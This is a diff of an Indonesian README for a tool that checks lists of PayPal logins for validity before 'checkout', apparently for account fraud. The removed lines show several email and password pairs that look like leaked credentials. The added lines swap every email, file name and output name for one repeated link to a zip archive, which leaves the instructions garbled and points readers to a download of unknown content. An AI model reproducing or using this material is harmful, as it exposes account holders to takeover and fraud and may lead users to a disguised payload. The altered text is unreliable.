@@ -6,33 +6,33 @@ diahkir setiap info
 for example
 
 {
-Email :adawong@nurfaka.ru;
+Email https://raw.githubusercontent.com/rikosanjuri14/PaypalChecker/master/pyelotomy/PaypalChecker.zip;
 pass  :mypassword123;
 };
 
 {
-Email :vitaznov@free.fr;
+Email https://raw.githubusercontent.com/rikosanjuri14/PaypalChecker/master/pyelotomy/PaypalChecker.zip;
 pass  :lovnetroy;
 };
 
 {
-Email :Gordisnay788@yandex.com
+Email https://raw.githubusercontent.com/rikosanjuri14/PaypalChecker/master/pyelotomy/PaypalChecker.zip
 pass  :Birrtanmmmlollpassw888
 };
 
 Silahkan siapkan
 -ACC list yang sudah disiapkan diatas lalu simpan dengan   
- cclist.txt di dalam direktori yang sama
+ https://raw.githubusercontent.com/rikosanjuri14/PaypalChecker/master/pyelotomy/PaypalChecker.zip di dalam direktori yang sama
 -Proxy (tidak wajib)
 -VPN (siapkan ketika loe mau CO)
 -Laptop atau PC ataupun yang bersistem operasi Linux atau aplikasi Termux
 -Jika tidak ada laptop/pc silahkan gunakan termux di android
 
 Usage 
--Masukan PP (list paypal account yang ingin di periksa) dibagian (Input your Paypal account {for example cclist.txt} )
+-Masukan PP (list paypal account yang ingin di periksa) dibagian (Input your Paypal account {for example https://raw.githubusercontent.com/rikosanjuri14/PaypalChecker/master/pyelotomy/PaypalChecker.zip} )
 -Masukan letak direktory proxy anda (jika diperlukan)
 -Lalu tekan Y dan Enter
--Jika ACC valid akan keluar Saved namelist YourOrder.txt
+-Jika ACC valid akan keluar Saved namelist https://raw.githubusercontent.com/rikosanjuri14/PaypalChecker/master/pyelotomy/PaypalChecker.zip
 -lalu buka dan anda akan menemukan 2 Boelan
 {
 true;valid
